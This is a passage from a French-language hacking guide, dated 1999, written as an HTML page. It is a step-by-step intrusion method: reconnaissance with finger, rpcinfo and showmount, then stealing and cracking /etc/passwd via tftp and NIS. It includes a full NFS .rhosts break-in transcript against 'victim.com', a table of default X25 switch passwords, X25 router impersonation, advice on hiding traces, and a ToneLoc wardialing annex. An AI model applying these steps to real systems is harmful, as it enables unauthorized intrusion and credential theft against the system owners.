   3:10pm  up 10 min,  4 users,  load average: 0.04, 0.09, 0.07
 
 Login: test           			Name: test passwd
 Directory: /home/test               Shell: /bin/bash
 On since Wed Jul  9 15:08 (MET DST) on tty3   1 minute 9 seconds idle
 No mail.
 Project:
 Je travaille sur le projet X
 No Plan.</pre>
        <p align="justify">Toutes les informations sur le champ gecos, les
        projets sur lesquels travaille l'utilisateur peuvent être utilisées
        dans une phase ultérieure d'agression. Parmi les utilisateurs, certains
        doivent être remarqués. par exemple, les utilisateurs &quot;guest&quot;
        ou &quot;demo&quot; qui n'ont fréquemment pas de mot de passe ou les
        comptes de produits (ingres, informix, etc.) qui ont fréquemment des
        mauvais mots de passe.
        <ul>
          <li>Récupérer des informations sur les RPC disponibles si le port
            mapper est lancé</li>
        </ul>
        la commande &quot;rpcinfo&quot; permet d'obtenir la liste des service
        RPC servis via le portmapper. Ces informations doivent être stockées
        pour un usage futur. la commande est :
        <ul>
          <li>rpcinfo -p @IP_machine</li>
        </ul>
        <pre> program vers proto   port
     100000    2   tcp    111  portmapper
     100000    2   udp    111  portmapper
     100005    1   udp    704  mountd
     100005    1   tcp    706  mountd
     100003    2   udp   2049  nfs
     100003    2   tcp   2049  nfs</pre>
        L'un des points importants concerne la détection de NFS (nfsd, mountd
        dans les services). Un autre type de service doit être remarqué,
        l'usage de NIS et des yellows pages (yp). Je vous conseil d'utiliser un
        autr OS que linux, il existe beaucoup de problème de compils et d'utilsation
        de yp sur Linux, on peut via ces services optenir la map du yppasswd et
        des autres fichiers gérés par NIS (outil ypsnarf, ypghost, etc.).
        <p align="justify">&nbsp;
        <ul>
          <li>Récupérer des informations sur les partitions NFS exportées</li>
        </ul>
        La commande &quot;showmount&quot; permet de savoir si des partitions NFS
        sont accessibles et pour quelles machines. Ces informations doivent
        être stockées pour un usage futur. La commande est :
        <p align="justify">&nbsp;
        <pre>showmount -e @IP_machine
 Un résultat du type :
 Export list for 127.0.0.1:
 /home (everyone)</pre>
        signifie que la partition /home est exportable pour toutes les machines
        sur internet. Plus fréquemment, on trouve un répertoire exportable
        vers des machines désignées. Si elles appartiennent au client, on sait
        que si on les cracke, on aura la possibilité de monter les répertoires
        correspondant sur une autre machine et ainsi de suite.
        <ul>
          <li>Se connecter sous ftp en connection anonyme et regarder ce que
            l'on trouve comme infos.</li>
        </ul>
        Certains sites mettent en place un site ftp d'accès libre. S'il existe,
        il peut être une source d'information (la version du ftpd, le type de
        machine UNIX ou NT , un nom de compte oublié dans le /etc/passwd de la
        partition anonyme, les vrais mots de passe dans le même fichier mais
        faut pas réver !). la commande est :
        <p align="justify">&nbsp;
        <pre>ftp @IP_machine
user      anonymous
...  entrer votre E-Mail comme mot de passe ...
password  guest </pre>
        <b>Résultat :</b><br>
        On dispose alors d'une liste d'adresse IP de machines qui répondent et
        des informations sur les couches réseaux actives sur ces machines. En
        ayant lancé soit le ftp, soit finger, soit le SMTP, on doit avoir
        également une idée des versions de ces différentes couches ainsi que
        le type d'OS des machines. On peut également avoir stocké des noms
        d'utilisateurs (finger, /etc/passwd du ftp anonyme, etc.). La plupart
        des OS et des couches ont des bugs connus et référencés dans les avis
        des CERTS US ou australiens
        <p align="justify"><b>Remarque</b><br>
        Ici, je vous ai présenté différentes technique pour l'intrusion il en
        existe des centaines, souvent ephémères leur solution réside souvent
        dans l'application d'un patch, pour les secteurs d'actitvités qui
        possèdent un administrateur orienté sécurité, la porte est ouverte
        quelques heures. Et pour d'autres c'est portes ouvertes tous les jours !
        Pour connaitre les dernières failles, une culture des DOS (Denial of
        Service) que je traduirai par trou de sécurité, doit se faire par une
        consultation des sites sur le sujets (www.antionline.com, www.rootshell
        si il vit encore... voir liens sur le site)
        <p align="justify">&nbsp;
        <p align="justify"><br>
        <br>
        <h2><b>Axe X25</b></h2>
        <p align="justify">Les moyens d'accès à un réseau X25 sont variables
        :
        <p align="justify">&nbsp;
        <ol>
          <li>PAD public de TRANSPAC
          <li>PAD privé de la cible
          <li>PAD via X32
          <li>accès X25 natif via LS
          <li>accès X25 natif via Transpac
          <li>accès X25 natif via X32 par le RTC
          <li>accès X25 natif sur le canal D Numéris</li>
        </ol>
        Les outils dont nous disposons sont :
        <p align="justify">&nbsp;
        <ul>
          <li>l'accès au travers d'un PAD public en facturation au demandé,
          <li>l'utilisation de notre accès X32 en facturation au demandeur
            (avec la possibilité sur cette carte de valoriser un champ USERDATA,
            d'utiliser IP sur X25 (non qualifiée), d'utiliser du PAD sur
            l'accès X32, de développer grace à l'API de la carte).</li>
        </ul>
        <p align="justify">Nous sommes donc a priori capable d'émuler les
        moyens d'accès 1, 3, 6. Si nous trouvons un PAD privé de la cible
        (c'est arrivé), nous sommes alors capable d'émuler 2. Il nous manque
        donc la LS (c'est évident), le X25 Transpac pur et Numéris. Au moyen
        des accès dont nous disposons, il est possible d'atteindre (suivant
        leur configuration) des commutateurs, des routeurs ou des machines
        terminales. Il est possible également en spécifiant le contenu du
        champ user data du paquet d'appel de diagnostiquer l'utilisation d'encapsulations
        SNA/X25, DSA/X25 ou IP/X25. Utilisation d'un accès PAD
        <ul>
          <li>connexion au PAD (ex 0836044444, 7E1)
          <li>éventuellement contrôle des paramètres : (PAR?), et
            modification si nécessaire (SET X:Y pour changer)
          <li>saisie d'une adresse Transpac ou d'une adresse avec des données
            utilisateur au format adresseDdonnées et avec 16 caractères de
            données seulement</li>
        </ul>
        Il y a alors soit connexion (affichage de COM, suivi d'autre chose),
        soit rejet (message de libération CLR XX YYY où XX est la cause et YYY
        le diagnostic) On peut en cours de communication repasser en mode
        commande en faisant ^P<br>
        <br>
        Utilisation de la carte X32
        <ul>
          <li>La carte X32 est configurée . Il faut donc dans un premier temps
            lancer les services de réseau
          <li>Ensuite au travers de l'icone &quot;test X25&quot;, on peut
            essayer différents types de connexions
          <li>Saisie d'une adresse Transpac ou d'une adresse avec des données
            utilisateur au format adresseDdonnées et avec 16 caractères de
            données seulement</li>
        </ul>
        Il y a alors soit connexion (affichage de COM, suivi d'autre chose),
        soit rejet (message de libération CLR XX YYY où XX est la cause et YYY
        le diagnostic) on peut en cours de communication repasser en mode
        commande en faisant ^P Mécanismes de controles possibles, par ordre de
        réalisation
        <pre>Existence du correspondant
 	Si ce n'est pas le cas, message CLR NP YYY
 appartenance au GFA, effectué par le dernier commutateur TRANSPAC
 	message CLR NA YYY
 inhibition du PCV
 	message CLR RNA YYY</pre>
        contrôle de l'adresse appelante par le commutateur de la cible<br>
        contrôle des données du paquet d'appel par le commutateur ou
        l'équipement terminal<br>
        contrôle en fonction de la sous adresse (qui suit les 9 chiffres) par
        le commutateur<br>
        dans les trois cas, rejet par le distant, souvent LIB DTE<br>
        Accès à des configurateurs<br>
        Les routeurs CISCO sont accessibles en PAD comme par telnet. Une access
        list peut être configurée pour contrôler les accès aux consoles
        virtuelles (les mêmes vtyX).
        <p align="justify">Les commutateurs X25 ont en général un
        configurateur accessible en PAD<br>
        Si l'on ne fournit pas de sous adresse, le comportement dépend de la
        configuration du commutateur et de leurs caractéristiques par défaut
        <p align="justify">&nbsp;
        <table align="center" border="1">
          <colgroup>
            <col span="4">
          <tbody>
            <tr>
              <td>marque</td>
              <td>sous adresse</td>
              <td>mot de passe</td>
              <td>divers</td>
            </tr>
            <tr>
              <td>matracom</td>
              <td>&nbsp;</td>
              <td>gsy91</td>
              <td>faire ^U pour voir la bannière</td>
            </tr>
            <tr>
              <td>OST</td>
              <td>9, 99, 999</td>
              <td>bonjour ou hello</td>
              <td>&nbsp;</td>
            </tr>
            <tr>
              <td>TRT</td>
              <td>Souvent des 9</td>
              <td>CCLAER</td>
              <td>prompt = &quot;*&quot;</td>
            </tr>
          </tbody>
        </table>
        <p align="justify">Quelques infos sur les commutateurs TRT, en vrac :
        <ul>
          <li>ils gèrent jusqu'à des sous adresse de 4 chiffres, de taille
            fixe
          <li>il y a padding à droite avec des 0, ou troncature des digits
            surnuméraires à droite
          <li>pas d'écho du mot de passe
          <li>divers services sont accessibles suivant le contenu du champ USER
            DATA
            <ul>
              <li>10CC configurateur
              <li>00GG générateur
              <li>14SS statistiques
              <li>04OO observation
              <li>O2EE événements remarquables
              <li>12MM télémaintenance</li>
            </ul>
          </li>
        </ul>
        <h4><b>Accès à des routeurs</h4>
        </b>
        <p align="justify">En connaissant les adresses de deux routeurs
        communiquant en IP sur X25, et sous réserve qu'il n'y ait pas de GFA ni
        de contrôle de l'adresse de l'appelant, il doit être possible de se
        faire passer pour l'un des deux routeurs vis à vis de l'autre.Ceci
        donne donc un accès au réseau IP, et permet de plus d'usurper les
        adresses IP
        <p align="justify">Il est plus que vraisemblable que ceci ne soit
        réalisable que lorsque le routeur que l'on usurpe n'est pas en
        communication avec le routeur cible.
        <p align="justify">Quelques réserves (à valider) sont cependant à
        émettre. Il semble en effet que dans le cas des routeurs CISCO, les
        échanges se fassent sur des circuits virtuels ditincts, le routeur
        appelé ouvrant alors le second circuit virtuel vers l'adresse X25 du
        routeur que nous usurpons. Il ne peut donc alors y avoir de retour. Ceci
        pourrait peut être contourné en modifiant la configuration de la cible
        via SNMP.
        <p align="justify">La fraude dans le cas de SNA sur X25 semble encore
        plus complexe, car il est impératif de disposer d'un accès licitement
        défini dans la VTAM list, faute de quoi la communication ne saura
        s'établir.
        <h4><b>Analyse des informations présentes dans la configuration d'un
        routeur</h4>
        </b>
        <p align="justify">La connaissance de sa propre adresse X25 est
        probablement impossible, puisqu'il n'y a pas de raison qu'elle soit
        mentionnée dans sa configuration.
        <p align="justify">Par contre, si l'on a accès aux configurations de
        deux machines communiquant l'une avec l'autre à travers X25 en faisant
        de l'encapsulation, il doit être possible de déperminer les adresses
        X25 de chacune des deux :
        <ul>
          <li>en regardant le routage au niveau de chacune des deux machines,
          <li>en recherchant des correspondances d'adresses (par exemple IP et
            X25) à corréler avec la connaissace des adresses autres qu'X25 qui
            correspondent à chacun des deux équipements.</li>
        </ul>
        <br>
        <hr>
        <br>
        <br>
        <br>
        <h2><b>Phase 3 : Axe Internet</h2>
        </b>
        <p align="justify">On dispose à l'issue de la phase 2 d'adresses IP de
        réseau ou de machines accessibles.
        <p align="justify">Il n'existe pas de méthode toute faite pour le hack,
        chaque hacker detient son experience, c'est souvent à partir ce cette
        limite qu'il découvre son talent ou pas. A partir de cette étape tous
        ce vous pouvez faire est considéré comme illicite par la loi.<br>
        Il existe des techniques d'approche, je vous ai présenté la ligne
        directrice vers le hack de base, cette méthode présente un danger,
        celui de la trace laissée par les différents outils utilisés (la
        qualité d'un bon hack, va se lire à sa tracabilité):
        <ul>
          <li>Pour commencer lancer les outils d'analyses :
          <li>SATAN (semble être remplacé par SAINT) ou Nessus (pour plus
            d'informations voir le hackoff7).
          <li>ISS version freeware. Il fait tellement peu de chose que ce n'est
            même pas la peine de le lancer.
          <li>ISS en version commerciale =&gt; pour ceux qui l'ont acheté...
          <li>NAT10 qui est un outil pour récupérer des infos sur les machines
            supportant netbios.</li>
        </ul>
        <p align="justify">A partir de cette étape, nous detenons un premièr
        audit du réseau: machines par IP, type d'OS, les ports ouverts, et les
        eventuels DOS connu par l'outils d'analyses. Le passage d'un tel outil
        laisse des traces et il existe des logiciel pour répérer des
        tentatives d'intrusions, il est préférable de se deconnecter et de se
        faire attribuer une IP différentes, chez un provider gratuit avec une
        identité inconnue (www.vunet.com)
        <p align="justify">La suite :
        <ul>
          <li>utiliser les DOS et toutes les bug connus, identifiés en phase 2
            :
          <li>tftp pour rapatrier /etc/passwd, /etc/hosts, etc.
          <li>partition NFS montable pour tous,
          <li>NIS accessible,
          <li>etc.
          <li>se connecter à la machine au travers des émulateurs comme telnet,
            rlogin, etc.</li>
        </ul>
        On connaît les noms des utilisateurs (via finger), on connaît
        l'adresse IP de la machine, il est donc possible de tenter d'y acceder.
        Telnet est disponible sous UNIX et sous Windows 3. A priori, il doit
        être possible de le rapatrier sous WinNT et 95. Personnellement
        j'utilise plutôt le telnet UNIX. Avec telnet, la commande est :
        <ul>
          <li>telnet @IP_machine</li>
        </ul>
        La machine vous demandera alors le nom d'utilisateur puis le mot de
        passe si nécessaire. Si le compte dispose d'un mot de passe, on rentre
        alors dans de la tentative de divination. Dans tous les cas, on obtient,
        grâce à la bannière, le nom de la machine et très fréquemment son
        OS. avec rlogin, la commande est :
        <ul>
          <li>rlogin -l user @IP_machine</li>
        </ul>
        Il peut être interessant de tester des comptes autres que
        &quot;root&quot; si par hasard la machine met en oeuvre un dispositif de
        confiance. Lancer les outils d'analyse :
        <ul>
          <li>Satan, Nessus, saint</li>
        </ul>
        Satan est donc disponible sur la machine Linux spécialisée pour le
        hacking. Utiliser les bugs détecté en phase 2 :
        <ol>
          <li>vérifier s'il n'existe pas un compte &quot;guest&quot;, &quot;demo&quot;,
            etc. sans mot de passe (rlogin ou telnet),
          <li>vérifier si la machine n'accepte pas tftp,
          <li>vérifier s'il n'est pas possible de monter par NFS une partition
            utilisateur (showmount),
          <li>vérifier si le client n'utilise pas NIS (ypxxxx dans rpcinfo) et
            récupérer alors les tables NIS (la méthode n'est pas encore très
            claire et n'est pas compilable sous linux qui ne supporte pas NIS
            =&gt; machine UNIX type SUN).</li>
        </ol>
        Si l'on est dans le cas 1,
        <ul>
          <li>on se connecte, on recherche une faille système (.rhost,
            hosts.equiv, etc.),
          <li>on rapatrie le fichier /etc/passwd, s'il n'est pas en mode C2, on
            y trouve les mots de passe chiffrés =&gt; on peut le casser avec le
            logiciel cracker, sinon on y trouve quant même la liste des
            utilisateurs et le champ commentaire associé (voir divination du
            mot de passe).</li>
        </ul>
        Si l'on est dans le cas 2,
        <ul>
          <li>on se connecte par tftp sur la cible,
          <li>on tente de rapatrier le fichier /etc/passwd, s'il est accessible,
            soit il contient les mots de passes chiffrés (passage du cracker),
            sinon la liste des comptes (divination),
          <li>on peut également voir quels sont les autres fichiers qui peuvent
            être accédés.</li>
        </ul>
        Si l'on est dans le cas 3,
        <ul>
          <li>on monte la partition sur notre machine par la commande &quot;mount
            / <a compléter>&quot;. A priori, cette commande est une commande
            UNIX uniquement.
            <li>on regarde qui sont les propriétaires des fichiers et
              répertoires de la partition,
            <li>on crée dans son propre &quot;/etc/passwd&quot; un compte ayant
              les mêmes UID ou GID,
            <li>on se connecte sur ce compte,
            <li>on crée un fichier &quot;.rhost&quot; contenant l'adresse IP de
              notre machine dans le répertoire $HOME de l'utilisateur dans la
              partition NFS,
            <li>on se connecte par &quot;rlogin @IP_machine&quot; et
              normalement, la machine distante ne doit pas demander de mot de
              passe pour ce compte.
            <li>Exemple donné dans une doc de hacker. Le répertoire de login
              exporté par NFS est &quot;/export/foo&quot;, le compte à usurper
              est &quot;guest&quot; et notre machine a pour adresse IP
              &quot;194.86.157.110&quot; :</li>
          </ul>
          <pre> evil# mount victim.com:/export/foo /foo
 evil# cd /foo
 evil# ls -lag
 total 3
   1 drwxr-xr-x 11 root     daemon        512 Jun 19 09:47 .
   1 drwxr-xr-x  7 root     wheel         512 Jul 19  1991 ..
   1 drwx--x--x  9 10001    daemon       1024 Aug  3 15:49 guest
 evil# echo guest:x:10001:1:temporary breakin account:/: &gt;&gt; /etc/passwd
 evil# ls -lag
  total 3
    1 drwxr-xr-x 11 root     daemon        512 Jun 19 09:47 .
    1 drwxr-xr-x  7 root     wheel         512 Jul 19  1991 ..
    1 drwx--x--x  9 guest    daemon       1024 Aug  3 15:49 guest
 evil # su guest
 evil % echo 194.86.157.110 &gt;&gt; guest/.rhosts
 evil % rlogin victim.com
 	 Welcome to victim.com!
 victim %
</pre>
          Si l'on est dans le cas 4,
          <ul>
            <li>on recherche le nom de domaine (a faire),
            <li>on utilise &quot;ypcat -d nom_du_domaine passwd&quot; pour
              récupérer le fichier yppasswd et on le passe alors avec cracker
              (cracker de mot de passe).
            <li>retrouver les DOS fréquents sur l'OS cible et les essayer</li>
          </ul>
          <p align="justify">&nbsp;
          <p align="justify">&nbsp;
          <p align="justify"><br>
          <br>
          <h2><b>Annexes</b></h2>
          <p align="justify">&nbsp;
          <h3>Annexe 1 : Toneloc : l'outil de recherche de modem</h3>
          <p align="justify">Toneloc
          <p align="justify">&nbsp;
          <p align="justify">toneloc datafile /M:[mask] /R:[range] /D:[range]
          /X:[mask] /#:[nombre] /C[config] /S:[StartTime] /E:[EndTime]
          /H:[heure] /T:[-] /K:[-]
          <p align="justify">RQ : le séparateur &quot;:&quot; n'est pas
          obligatoire
          <p align="justify">Datafile Pas clair : plutot le fichier contenant la
          liste des plages de numéros à essayer (ou fichier dans lequel est
          enregistré le résultat ?)
          <ul>
            <li>/M:[mask] Le masque avec des X pour les numéros devant être
              dialés par exemple /M:01419139XX
            <li>/R:[range] Limitation du mask à une plage plus précise devant
              être essayée par exemple /R:10-19
            <li>/D:[range] Plage de numéros à ne pas essayer par exemple
              /D:20-29
            <li>/X:[mask] Masque des numéros à ne pas essayer (idem /D mais
              sous forme de mask) par exemple /X:2X (rqs : ne pas mettre
              014191392X et on peut mettre plusieurs exclusions)<br>
            <li>/#:[nombre] Limitation à un nombre d'appel précis par exemple
              /#:99 pour nous
            <li>/C[config] fichier de config de toneloc
            <li>/S:[StartTime] heure de début en format /S:5:30p ou /S:17:30
            <li>/E:[EndTime] heure de fin en format /E:5:30p ou /E:17:30
            <li>/H:[heure] Durée de test (on utilise /E ou /H) format /H:3:30
            <li>/T:[-] force un paramétre du fichier config.cfg : recherche de
              tonalités (ou pas si /T:-)
            <li>/K:[-] force un paramétre du fichier config.cfg : recherche de
              porteuse (ou pas si /K:-)</li>
          </ul>
          Essai 1 : toneloc 01419139XX /D:10-99
          <p align="justify">Utilitaires autour de toneloc :
          <ul>
            <li>TCONVERT : conversion de fichier de recherche de version
              précédente</li>
          </ul>
          <p align="justify">&nbsp;
          <p align="justify">&nbsp;
          <p align="justify"><br>
          <br>
          <h3><b>Annexe 2 : Liste des outils de hacking sous UNIX</b></h3>
          <p align="justify">&nbsp;
          <table border="1" width="550">
            <colgroup>
              <col span="4">
            <tbody>
              <tr>
                <td>Outil</td>
                <td>Fonction</td>
                <td>OS</td>
                <td>Site</td>
              </tr>
              <tr>
                <td>Connect</td>
                <td>Récupération auto /etc/passwd sur des sites via tftp</td>
                <td>UNIX</td>
                <td>&nbsp;</td>
              </tr>
              <tr>
                <td>NMAP</td>
                <td>Scanner de port, version graphique en Béta</td>
                <td>Linux</td>
                <td></a><a href="http://www.insecure.org/">http://www.insecure.org/</a></td>
            </tr>
            <tr>
              <td>Nessus</td>
              <td>Scanner d'intrusion</td>
              <td>Linux, java</td>
              <td><a href="http://www.nessus.org/">http://www.nessus.org/</a></td>
            </tr>
            <tr>
              <td>Saint</td>
              <td>scanner d'intrusion</td>
              <td>Linux</td>
              <td><a href="http://www.wwdsi.com/saint/">http://www.wwdsi.com/saint/</a></td>
            </tr>
            <tr>
              <td>John the Ripper</td>
              <td>Casse les mots de passe récupérés dans /etc/pssword</td>
              <td>Linux</td>
              <td><a href="http://www.false.com/security/john/">http://www.false.com/security/john/</a></td>
            </tr>
            <tr>
              <td>ADM snmp</td>
              <td>Un scanner de démon SNMP et il peut réaliser une attaque en
                force sur le nom de la communauté</td>
              <td>Linux</td>
              <td><a href="http://www.rootshell.org/archive-j457nxiqi3gq59dv/199902/ADMsnmp.0.1.tgz.html">http://www.rootshell.org/archive-j457nxiqi3gq59dv/199902/ADMsnmp.0.1.tgz.html</a></td>
            </tr>
            <tr>
              <td>Trinux</td>
              <td>linux sur 3 disk, orienté sécurité. Idéal pour sécuriser
                son réseau</td>
              <td>OS</td>
              <td><a href="ftp://ftp.trinux.org/pub/trinux/">ftp://ftp.trinux.org/pub/trinux/</a></td>
            </tr>
            <tr>
              <td>Cracker</td>
              <td>Casse les mots de passe, récupérés dans /etc/pssword</td>
              <td>Linux</td>
              <td><a href="http://www.opensec.net/">http://www.opensec.net/</a></td>
            </tr>
            <tr>
              <td>Hunt</td>
              <td>Outils de hack des switch</td>
              <td>Linux</td>
              <td><a href="http://www.cri.cz/kra">http://www.cri.cz/kra</a></td>
            </tr>
          </tbody>
        </table>
        <p align="left">Recoupement d'informations : <a href="mailto:cakeii@yahoo.com">cakeii</a><br>
        Validation et correction(s): <a href="mailto:tobozo@biosys.net">tobozo</a><br>
        Derniere mise a jour : 04-aout-99<br>
        no© <a href="http://come.to/legang">Serial Savate System</a>
        <p align="justify">&nbsp;</p>
      </td>
    </tr>
  </tbody>
</table>
</center>

</body>
